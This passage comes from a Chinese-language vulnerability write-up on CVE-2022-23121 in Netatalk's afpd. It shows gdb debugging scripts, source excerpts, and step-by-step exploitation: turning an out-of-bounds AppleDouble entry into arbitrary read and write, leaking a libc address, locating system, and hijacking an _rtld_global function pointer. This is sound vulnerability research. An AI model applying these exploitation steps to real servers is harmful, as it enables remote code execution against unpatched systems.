</span></span><span style=display:flex><span>zeroconf <span style=color:#f92672>=</span> no
</span></span><span style=display:flex><span>guest account <span style=color:#f92672>=</span> nobody
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span> Public <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>path <span style=color:#f92672>=</span>/tmp/afp_tmp/Public
</span></span><span style=display:flex><span>ea <span style=color:#f92672>=</span> auto
</span></span><span style=display:flex><span>convert appledouble <span style=color:#f92672>=</span> no
</span></span><span style=display:flex><span>stat vol <span style=color:#f92672>=</span> no
</span></span><span style=display:flex><span>file perm <span style=color:#f92672>=</span> <span style=color:#ae81ff>777</span>
</span></span><span style=display:flex><span>directory perm <span style=color:#f92672>=</span> <span style=color:#ae81ff>777</span>
</span></span><span style=display:flex><span>veto files <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/&#39;</span>
</span></span><span style=display:flex><span>rwlist <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;nobody&#34;</span>,<span style=color:#e6db74>&#34;@allaccount&#34;</span>
</span></span><span style=display:flex><span>valid users <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;nobody&#34;</span>,<span style=color:#e6db74>&#34;@allaccount&#34;</span>
</span></span><span style=display:flex><span>invalid users <span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#f92672>[</span> test <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>path <span style=color:#f92672>=</span> /tmp/afp_tmp/test
</span></span><span style=display:flex><span>ea <span style=color:#f92672>=</span> auto
</span></span><span style=display:flex><span>convert appledouble <span style=color:#f92672>=</span> no
</span></span><span style=display:flex><span>stat vol <span style=color:#f92672>=</span> no
</span></span><span style=display:flex><span>file perm <span style=color:#f92672>=</span> <span style=color:#ae81ff>777</span>
</span></span><span style=display:flex><span>directory perm <span style=color:#f92672>=</span> <span style=color:#ae81ff>777</span>
</span></span><span style=display:flex><span>veto files <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/Network Trash Folder/.!@#$recycle/.systemfile/lost+found/Nas_Prog/.!@$mmc/&#39;</span>
</span></span><span style=display:flex><span>rwlist <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;nobody&#34;</span>,<span style=color:#e6db74>&#34;@allaccount&#34;</span>
</span></span><span style=display:flex><span>valid users <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>,<span style=color:#e6db74>&#34;nobody&#34;</span>,<span style=color:#e6db74>&#34;@allaccount&#34;</span>
</span></span><span style=display:flex><span>invalid users <span style=color:#f92672>=</span>
</span></span></code></pre></div><p>参考：</p><blockquote><p><a href=https://nosec.org/home/detail/4997.html target=_blank>https://nosec.org/home/detail/4997.html</a></p></blockquote><h2 id=调试>调试</h2><p>在AFPD中，由子进程负责处理AFP请求，父进程则循环接受客户端的请求，所以这里只需要调试子进程即可，为了方便调试，编写了如下脚本，至于为什么设置条件断点<code>b ad_open.c:1894 if adflags & 2 != 0</code> 在后文说明。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>t.sh
</span></span><span style=display:flex><span>gdb -x debug.gdb attach <span style=color:#e6db74>`</span>ps -ef | grep  afpd | grep -v grep | grep -v cnid |awk <span style=color:#e6db74>&#39;{print $2}&#39;</span> | head -1<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>debug.gdb
</span></span><span style=display:flex><span>set follow-fork-mode child
</span></span><span style=display:flex><span>set detach-on-fork off
</span></span><span style=display:flex><span>set schedule-multiple on
</span></span><span style=display:flex><span>b ad_open.c:1894 <span style=color:#66d9ef>if</span> adflags &amp; <span style=color:#ae81ff>2</span> !<span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>c
</span></span><span style=display:flex><span>b ad_open.c:617
</span></span><span style=display:flex><span>b ad_open.c:605
</span></span></code></pre></div><p>启动AFPD服务</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./afpd -d -F /tmp/afp_tmp/afpd.conf
</span></span><span style=display:flex><span>./cnid_metad -d -F /tmp/afp_tmp/afpd.conf
</span></span></code></pre></div><h3 id=为什么要设置条件断点><strong>为什么要设置条件断点</strong></h3><p>将前面生成的appledouble文件通过nmap脚本上传到afp服务器，通过nmap脚本请求该文件触发该漏洞</p><p>如果断点没有设置<code>if adflags & 2 != 0</code> 这个条件则gdb会直接断在<code>ad_open.c:1894</code>，此时请求内<code>ADFLAGS_RF</code> 值为0，不能进入漏洞逻辑，而由于断点，afp无法及时回复nmap数据包，nmap会报超时。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/9.png></p><p>继续执行的话，afpd会收到<code>SIGALRM</code>信号，无法进入漏洞逻辑</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/10.png></p><h3 id=正常调试><strong>正常调试</strong></h3><p>上传的._read文件到test目录：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/11.png></p><p>触发漏洞，进入<code>parse_entries</code>函数内，<code>parse_entries</code>读取buf里面的数据到ad指向的<code>adouble</code>结构体中。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/12.png></p><p>最终adouble结构体内entry成员变量被设置为如下值，可以看出finderinfo entry内的off已经越界了：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/13.png></p><p>而正常appledouble文件内，每个<code>entry.ade_off+entry.ad_len</code>相加应该小于文件大小，在上图中第九个entry即finderinfo的entry.ade_off+entry.ad_len = A27 >文件大小，这个偏移也可以从文件内体现，此时finderinfo的off已越界，此时已经控制了<code>adouble.entry.off</code>。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/14.png></p><h3 id=如何利用entry内的越界>如何利用entry内的越界</h3><p>前面写到，<code>parse_entries</code>函数可以将adouble结构体内的entry的off和len相加大于文件大小，如果某个地方读取了这个off和len并作为offset读写数据则可能产生越界读写。</p><p>继续看ad_header_read_osx调用<code>parse_entries</code>之后的逻辑，在<code>parse_entries</code>中如果程序发现off+len越界则会返回-1，如果ad指向的adouble结构体内的<code>finderinfo entry</code>的<code>ade_len</code>不等于32则进入if逻辑内，调用到<code>ad_convert_osx</code>函数。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/15.png></p><p>在<code>ad_convert_osx</code>函数中，程序将appledouble文件映射到内存中，此时对文件映射的内存的读写即是对该文件的读写。<code>ad_convert_osx</code>函数映射之后调用了<code>memmove</code>和<code>ad_rebuild_adouble_header_osx</code>函数，之后通过<code>munmap</code>函数取消映射，将内存中的数据写入文件内。</p><p><code>mmap</code>的长度参数<code>origlen = ad_getentryoff(ad, ADEID_RFORK) + ad_getentrylen(ad, ADEID_RFORK)</code>即<code>ad.ADEID_RFORK.off + ad.ADEID_RFORK.len</code> 都为可控值</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>static int ad_convert_osx<span style=color:#f92672>(</span>const char *path, struct adouble *ad<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span> ......
</span></span><span style=display:flex><span>    origlen <span style=color:#f92672>=</span> ad_getentryoff<span style=color:#f92672>(</span>ad, ADEID_RFORK<span style=color:#f92672>)</span> + ad_getentrylen<span style=color:#f92672>(</span>ad, ADEID_RFORK<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    map <span style=color:#f92672>=</span> mmap<span style=color:#f92672>(</span>NULL, origlen, PROT_READ | PROT_WRITE, MAP_SHARED, ad_reso_fileno<span style=color:#f92672>(</span>ad<span style=color:#f92672>)</span>, 0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    ......
</span></span><span style=display:flex><span>    memmove<span style=color:#f92672>(</span>map + ad_getentryoff<span style=color:#f92672>(</span>ad, ADEID_FINDERI<span style=color:#f92672>)</span> + ADEDLEN_FINDERI,
</span></span><span style=display:flex><span>            map + ad_getentryoff<span style=color:#f92672>(</span>ad, ADEID_RFORK<span style=color:#f92672>)</span>,
</span></span><span style=display:flex><span>            ad_getentrylen<span style=color:#f92672>(</span>ad, ADEID_RFORK<span style=color:#f92672>))</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>ad_rebuild_adouble_header_osx<span style=color:#f92672>(</span>ad, map<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    munmap<span style=color:#f92672>(</span>map, origlen<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define ad_getentrylen(ad,eid)     ((ad)-&gt;ad_eid[(eid)].ade_len)</span>
</span></span><span style=display:flex><span>long ad_getentryoff<span style=color:#f92672>(</span>const struct adouble *ad, int eid<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>ad-&gt;ad_vers <span style=color:#f92672>==</span> AD_VERSION2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> ad-&gt;ad_eid<span style=color:#f92672>[</span>eid<span style=color:#f92672>]</span>.ade_off;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    switch <span style=color:#f92672>(</span>eid<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> ADEID_DFORK:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> 0;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> ADEID_RFORK:
</span></span><span style=display:flex><span><span style=color:#75715e>#ifdef HAVE_EAFD</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> 0;
</span></span><span style=display:flex><span><span style=color:#75715e>#else</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> ad-&gt;ad_eid<span style=color:#f92672>[</span>eid<span style=color:#f92672>]</span>.ade_off;
</span></span><span style=display:flex><span><span style=color:#75715e>#endif</span>
</span></span><span style=display:flex><span>    default:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> ad-&gt;ad_eid<span style=color:#f92672>[</span>eid<span style=color:#f92672>]</span>.ade_off;
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    /* deadc0de */
</span></span><span style=display:flex><span>    AFP_PANIC<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;What am I doing here?&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p><code>mmap</code>之后文件已映射到内存中，在经过多次测试后，当<code>resource fork length + resource fork offset ≤1000</code> 时会mmap分配的内存在ld.sodata段上面。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/16.png></p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/17.png></p><p><strong>任意写</strong></p><p>仔细看调用<code>memmove</code>时的参数，<code>map</code>为文件映射到内存的首地址，<code>ad_getentryoff</code>为获取指定entry id的entry的off，<code>ADEDLEN_FINDERI</code>为宏定义值为<code>32=0x20</code>，而我们可以控制各个entry的off和len，通过该处调用，即我们可以从<code>map + ad.ADEID_RFORK.off</code>处读取任意长度的数据写入到任何高于<code>map+0x20</code>的内存（前提是该地址可写）也就是将文件中<code>ad.ADEID_RFORK.off</code> 处的数据写入该内存，而<code>ad.ADEID_FINDERI.off</code>和<code>ad.ADEID_RFORK.off</code>都为可控值，即可达到任意写。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>    memmove<span style=color:#f92672>(</span>map + ad.ADEID_FINDERI.off + 0x20,
</span></span><span style=display:flex><span>            map + ad.ADEID_RFORK.off,
</span></span><span style=display:flex><span>            ad.ADEID_RFORK.len<span style=color:#f92672>)</span>;
</span></span></code></pre></div><p><strong>任意读</strong></p><p>任意读发生在任意写的后面的函数调用，在<code>ad_rebuild_adouble_header_osx</code> 函数中有如下语句，该语句将<code>ad.ad_data+ad.ADEID_FINDERI.off</code> 处开始长为0x20的数据写入到<code>adbuf+ADEDOFF_FINDERI_OSX</code>中，<code>ADEDOFF_FINDERI_OSX</code>为宏定义，展开后可得值为<code>26+2*12=50=0x32</code>，而adbuf为<code>mmap</code>映射后返回的内存地址，该处语句将数据写入到<code>mmap</code>映射的内存偏移<code>0x32</code>的位置。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#define ad_entry(ad,eid)           ((caddr_t)(ad)-&gt;ad_data + (ad)-&gt;ad_eid[(eid)].ade_off)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>ad_rebuild_adouble_header_osx</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>adouble</span> <span style=color:#f92672>*</span>ad, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>adbuf)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    ......
</span></span><span style=display:flex><span>    memcpy(adbuf <span style=color:#f92672>+</span> ADEDOFF_FINDERI_OSX, ad_entry(ad, ADEID_FINDERI), ADEDLEN_FINDERI);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define ADEDOFF_FINDERI_OSX  (AD_HEADER_LEN + ADEID_NUM_OSX*AD_ENTRY_LEN)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define AD_HEADER_LEN       (ADEDLEN_MAGIC + ADEDLEN_VERSION + ADEDLEN_FILLER + ADEDLEN_NENTRIES) </span><span style=color:#75715e>/* 26 */</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define ADEID_NUM_OSX           2
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define AD_ENTRY_LEN        12  </span><span style=color:#75715e>/* size of a single entry header */</span><span style=color:#75715e>
</span></span></span></code></pre></div><p>在调用完<code>ad_rebuild_adouble_header_osx</code> 函数后，程序调用<code>munmap</code>函数取消文件映射，内存内的数据会被写回到appledouble文件中，综合有：可以将<code>ad.ad_data+ad.ADEID_FINDERI.off</code> 处开始长为0x20的数据写入到文件偏移0x32处的地方，此时可以通过读取文件获取任意读的内存的内容。</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/18.png></p><p><strong>组合利用</strong></p><p>在内存中ad指向的结构体是存放在栈上的，分配的adouble结构体地址位于<code>ad_header_read_osx</code>栈帧的<code>rbp-0x620</code>处，可以用调试器测算和<code>__libc_start_main_ret</code>的地址</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/19.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  bt
</span></span><span style=display:flex><span><span style=color:#75715e>#0  0x00007f624307220b in ad_header_read_osx (path=0x7f62430d6bc0 &lt;pathbuf&gt; &#34;._read&#34;, ad=0x558ce325bba0, hst=0x7ffcf6e36990) at ad_open.c:698</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007f6243074e50 in ad_open_rf_ea (path=0x558ce2e38f80 &lt;upath&gt; &#34;read&#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1488</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007f62430750ae in ad_open_rf (path=0x558ce2e38f80 &lt;upath&gt; &#34;read&#34;, adflags=0x283, mode=0x0, ad=0x558ce325bba0) at ad_open.c:1529</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007f6243075d29 in ad_open (ad=0x558ce325bba0, path=0x558ce2e38f80 &lt;upath&gt; &#34;read&#34;, adflags=0x283) at ad_open.c:1895</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x0000558ce2e143bd in afp_openfork (obj=0x558ce2e4d920 &lt;obj&gt;, ibuf=0x7f6242b6c022 &#34;uthent&#34;, ibuflen=0x12, rbuf=0x558ce3245b10 &#34;&#34;, rbuflen=0x558ce3255b10) at fork.c:364</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  0x0000558ce2df2c81 in afp_over_dsi (obj=0x558ce2e4d920 &lt;obj&gt;) at afp_dsi.c:627</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x0000558ce2e193ff in dsi_start (obj=0x558ce2e4d920 &lt;obj&gt;, dsi=0x558ce3245420, server_children=0x558ce3242240) at main.c:474</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x0000558ce2e19102 in main (ac=0x4, av=0x7ffcf6e36fc8) at main.c:417</span>
</span></span><span style=display:flex><span>gef➤  i frame <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span>Stack frame at 0x7ffcf6e36ee0:
</span></span><span style=display:flex><span> rip <span style=color:#f92672>=</span> 0x558ce2e19102 in main <span style=color:#f92672>(</span>main.c:417<span style=color:#f92672>)</span>; saved rip <span style=color:#f92672>=</span> 0x7f6242e51083
</span></span><span style=display:flex><span> caller of frame at 0x7ffcf6e36d80
</span></span><span style=display:flex><span> source language c.
</span></span><span style=display:flex><span> Arglist at 0x7ffcf6e36d78, args: ac<span style=color:#f92672>=</span>0x4, av<span style=color:#f92672>=</span>0x7ffcf6e36fc8
</span></span><span style=display:flex><span> Locals at 0x7ffcf6e36d78, Previous frame<span style=color:#960050;background-color:#1e0010>&#39;</span>s sp is 0x7ffcf6e36ee0
</span></span><span style=display:flex><span> Saved registers:
</span></span><span style=display:flex><span>  rbp at 0x7ffcf6e36ed0, rip at 0x7ffcf6e36ed8
</span></span><span style=display:flex><span>gef➤  p &amp;adosx.ad_data
</span></span><span style=display:flex><span>$11 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>char <span style=color:#f92672>(</span>*<span style=color:#f92672>)[</span>1024<span style=color:#f92672>])</span> 0x7ffcf6e36522
</span></span><span style=display:flex><span>gef➤  p 0x7ffcf6e36ed8 - 0x7ffcf6e36522
</span></span><span style=display:flex><span>$12 <span style=color:#f92672>=</span> 0x9b6
</span></span></code></pre></div><p>任意读是读取<code>ad.ad_data+ad.ADEID_FINDERI.off</code> 处长为<code>0x20</code>的数据，而<code>ad.ad_data</code> 距离<code>__libc_start_main_ret</code>为<code>0x9b6</code>，所以可以设置<code>ad.ADEID_FINDERI.off</code> 为0x9b6以获取<code>__libc_start_main_ret</code>地址。利用脚本构造文件并利用NSE脚本上传到服务器</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/20.png></p><p>通过命令触发该漏洞、</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/21.png></p><p><code>__libc_start_main_ret</code>地址已经回显在文件内</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/22.png></p><p>验证地址:</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/23.png></p><p>在
<a href=https://libc.rip/ target=_blank>https://libc.rip</a> 上验证libc版本：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/24.png></p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/25.png></p><p>通过<code>__libc_start_main_ret</code>地址可以测算<code>system</code>函数地址</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  p 0x7f6242e51083 - 0x24083 + 0x52290
</span></span><span style=display:flex><span>$14 <span style=color:#f92672>=</span> 0x7f6242e7f290
</span></span><span style=display:flex><span>gef➤  p system
</span></span><span style=display:flex><span>$15 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>int <span style=color:#f92672>(</span>const char *<span style=color:#f92672>)}</span> 0x7f6242e7f290 &lt;__libc_system&gt;
</span></span><span style=display:flex><span>gef➤
</span></span></code></pre></div><p><strong>至此，我们得到了system函数地址，那么如何利用这个地址呢？</strong></p><p>Netatalk每次收到客户端请求都是fork子进程处理该请求，父进程继续监听socket，而fork的子进程内存空间和父进程内存空间的内容一样即libc库载入的地址不变，所以可以先发送请求通过任意读获取到system函数地址，第二次发送请求时，由于父进程不变所以<code>system</code>函数地址不变，通过任意写的<code>system</code>函数地址不变，才能达到命令执行的效果。</p><p>正是因为fork后，内存空间不变的机制才能利用任意读获取到<code>system</code>函数地址，而后通过任意写覆盖函数指针达到命令执行的效果。</p><p>在Netatalk执行过程中，程序出错不会立即退出而是会捕获异常，通过任意写，写入了ld.so的数据段，触发错误，导致了如下崩溃：</p><p><img alt src=/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/26.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  bt
</span></span><span style=display:flex><span><span style=color:#75715e>#0  0x00007efeac84c59d in _dl_open (file=0x7efeac733eb9 &#34;libgcc_s.so.1&#34;, mode=0x80000002, caller_dlopen=0x7efeac6acfb9 &lt;init+25&gt;, nsid=0xfffffffffffffffe, argc=0x4, argv=0x7ffd9f27a1e8, env=0x7ffd9f27a210) at dl-open.c:786</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007efeac6df8c1 in do_dlopen (ptr=ptr@entry=0x7ffd9f277d60) at dl-libc.c:96</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007efeac6e0928 in __GI__dl_catch_exception (exception=exception@entry=0x7ffd9f277d00, operate=operate@entry=0x7efeac6df880 &lt;do_dlopen&gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:208</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007efeac6e09f3 in __GI__dl_catch_error (objname=objname@entry=0x7ffd9f277d50, errstring=errstring@entry=0x7ffd9f277d58, mallocedp=mallocedp@entry=0x7ffd9f277d4f, operate=operate@entry=0x7efeac6df880 &lt;do_dlopen&gt;, args=args@entry=0x7ffd9f277d60) at dl-error-skeleton.c:227</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00007efeac6df9f5 in dlerror_run (args=0x7ffd9f277d60, operate=0x7efeac6df880 &lt;do_dlopen&gt;) at dl-libc.c:46</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#5  __GI___libc_dlopen_mode (name=name@entry=0x7efeac733eb9 &#34;libgcc_s.so.1&#34;, mode=mode@entry=0x80000002) at dl-libc.c:195</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#6  0x00007efeac6acfb9 in init () at backtrace.c:54</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#7  0x00007efeac7834df in __pthread_once_slow (once_control=0x7efeac76fe68 &lt;once&gt;, init_routine=0x7efeac6acfa0 &lt;init&gt;) at pthread_once.c:116</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#8  0x00007efeac6ad104 in __GI___backtrace (array=&lt;optimized out&gt;, size=&lt;optimized out&gt;) at backtrace.c:111</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#9  0x00007efeac7ec7ff in netatalk_panic (why=0x7efeac818148 &#34;internal error&#34;) at fault.c:93</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#10 0x00007efeac7eca69 in fault_report (sig=0xb) at fault.c:127</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#11 0x00007efeac7ecac3 in sig_fault (sig=0xb) at fault.c:147</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#12 &lt;signal handler called&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#13 __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#14 0x00007efeac7c10e2 in ad_rebuild_adouble_header_osx (ad=0x7ffd9f279540, adbuf=0x7efeac863000 &#34;&#34;) at ad_flush.c:187</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#15 0x00007efeac7c4d4c in ad_convert_osx (path=0x7efeac829bc0 &lt;pathbuf&gt; &#34;._cmd&#34;, ad=0x7ffd9f279540) at ad_open.c:617</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#16 0x00007efeac7c5379 in ad_header_read_osx (path=0x7efeac829bc0 &lt;pathbuf&gt; &#34;._cmd&#34;, ad=0x55dcb6856780, hst=0x7ffd9f279bb0) at ad_open.c:713</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#17 0x00007efeac7c7e50 in ad_open_rf_ea (path=0x55dcb5a7ef80 &lt;upath&gt; &#34;cmd&#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1488</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#18 0x00007efeac7c80ae in ad_open_rf (path=0x55dcb5a7ef80 &lt;upath&gt; &#34;cmd&#34;, adflags=0x283, mode=0x0, ad=0x55dcb6856780) at ad_open.c:1529</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#19 0x00007efeac7c8d29 in ad_open (ad=0x55dcb6856780, path=0x55dcb5a7ef80 &lt;upath&gt; &#34;cmd&#34;, adflags=0x283) at ad_open.c:1895</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#20 0x000055dcb5a5a3bd in afp_openfork (obj=0x55dcb5a93920 &lt;obj&gt;, ibuf=0x7efeac2bf021 &#34;Authent&#34;, ibuflen=0x11, rbuf=0x55dcb6840b10 &#34;&#34;, rbuflen=0x55dcb6850b10) at fork.c:364</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#21 0x000055dcb5a38c81 in afp_over_dsi (obj=0x55dcb5a93920 &lt;obj&gt;) at afp_dsi.c:627</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#22 0x000055dcb5a5f3ff in dsi_start (obj=0x55dcb5a93920 &lt;obj&gt;, dsi=0x55dcb6840420, server_children=0x55dcb683d240) at main.c:474</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#23 0x000055dcb5a5f102 in main (ac=0x4, av=0x7ffd9f27a1e8) at main.c:417</span>
</span></span></code></pre></div><p>可以看到，程序试图调用位于<code>0x4141414141414000</code>处的函数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gef➤  x /i $pc
</span></span><span style=display:flex><span><span style=color:#f92672>=</span>&gt; 0x7efeac84c59d &lt;_dl_open+61&gt;:        call   QWORD PTR <span style=color:#f92672>[</span>rip+0x199c5<span style=color:#f92672>]</span>        <span style=color:#75715e># 0x7efeac865f68 &lt;_rtld_global+3848&gt;</span>
</span></span><span style=display:flex><span>gef➤  x /gx 0x7efeac865f68
</span></span><span style=display:flex><span>0x7efeac865f68 &lt;_rtld_global+3848&gt;:     0x4141414141414000
</span></span><span style=display:flex><span>gef➤
</span></span></code></pre></div><p>在
<a href=https://code.woboq.org/userspace/glibc/elf/dl-open.c.html target=_blank>https://code.woboq.org/userspace/glibc/elf/dl-open.c.html</a> 可以看到<code>_dl_open</code>函数源码，该处为<code>_dl_open</code>函数试图通过函数指针调用<code>__rtld_lock_lock_recursive</code>指向的函数并把<code>_dl_load_lock</code>地址作为指针参数传入该函数内。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>void *
</span></span><span style=display:flex><span>_dl_open <span style=color:#f92672>(</span>const char *file, int mode, const void *caller_dlopen, Lmid_t nsid,
</span></span><span style=display:flex><span>          int argc, char *argv<span style=color:#f92672>[]</span>, char *env<span style=color:#f92672>[])</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>((</span>mode &amp; RTLD_BINDING_MASK<span style=color:#f92672>)</span> <span style=color:#f92672>==</span> 0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    /* One of the flags must be set.  */
</span></span><span style=display:flex><span>    _dl_signal_error <span style=color:#f92672>(</span>EINVAL, file, NULL, N_<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;invalid mode for dlopen()&#34;</span><span style=color:#f92672>))</span>;
</span></span><span style=display:flex><span>  /* Make sure we are alone.  */
